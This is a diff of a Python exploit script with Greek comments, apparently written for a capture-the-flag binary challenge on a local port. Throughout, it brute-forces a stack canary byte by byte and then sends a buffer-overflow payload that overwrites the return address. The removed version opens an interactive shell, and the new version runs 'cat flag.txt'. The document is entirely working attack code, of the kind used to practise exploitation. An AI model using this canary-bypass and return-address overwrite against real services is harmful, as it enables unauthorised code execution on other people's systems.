@@ -1,36 +1,38 @@
 import socket
-import time
 
-host, port = '127.0.0.1', 28285
-canary = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00"
-addr = b"\x26\x92\x04\x08"
+def get_canary():
+    host, port = '127.0.0.1', 28285
+    known_canary = b""
+    # Βρίσκουμε τα 8 bytes του καναρινιού ένα-ένα
+    for i in range(8):
+        for b in range(256):
+            test_byte = bytes([b])
+            payload = b"A" * 122 + known_canary + test_byte
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                s.connect((host, port))
+                s.sendall(payload)
+                res = s.recv(1024)
+                if b"Stack smashing" not in res:
+                    known_canary += test_byte
+                    print(f"[+] Found byte {i}: {test_byte.hex()}")
+                    s.close()
+                    break
+                s.close()
+            except:
+                continue
+    return known_canary
 
-# Δοκιμάζουμε ένα εύρος γύρω από το 28 που βρήκες τοπικά
-for junk in range(8, 41, 4):
-    print(f"[*] Trying junk size: {junk}")
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(0.5)
-        s.connect((host, port))
-        
-        # Στέλνουμε το payload + μια εντολή ls αμέσως μετά
-        payload = b"A" * 122 + canary + b"A" * junk + addr + b"\n"
-        s.sendall(payload)
-        
-        # Δίνουμε λίγο χρόνο στον server να επεξεργαστεί το shell
-        time.sleep(0.1)
-        s.sendall(b"ls\n")
-        
-        response = s.recv(4096)
-        if len(response) > 0 and b"Twit" not in response:
-            print(f"\n[!!!] SHELL FOUND AT JUNK {junk}!")
-            print(response.decode(errors='ignore'))
-            # Κράτα τη σύνδεση για να γράψεις cat flag.txt
-            while True:
-                cmd = input("$ ")
-                s.sendall(cmd.encode() + b"\n")
-                print(s.recv(4096).decode())
-    except:
-        continue
-    finally:
-        s.close()
+# 1. Βρες το φρέσκο καναρίνι
+canary = get_canary()
+
+# 2. Χτύπα με το καναρίνι που μόλις βρήκες
+if len(canary) == 8:
+    print(f"[*] Live Canary: {canary.hex()}")
+    # Δοκιμάζουμε το Junk 28 που δούλεψε τοπικά
+    payload = b"A" * 122 + canary + b"A" * 28 + b"\x26\x92\x04\x08" + b"\ncat flag.txt; exit\n"
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('127.0.0.1', 28285))
+    s.sendall(payload)
+    print(s.recv(4096).decode(errors='ignore'))
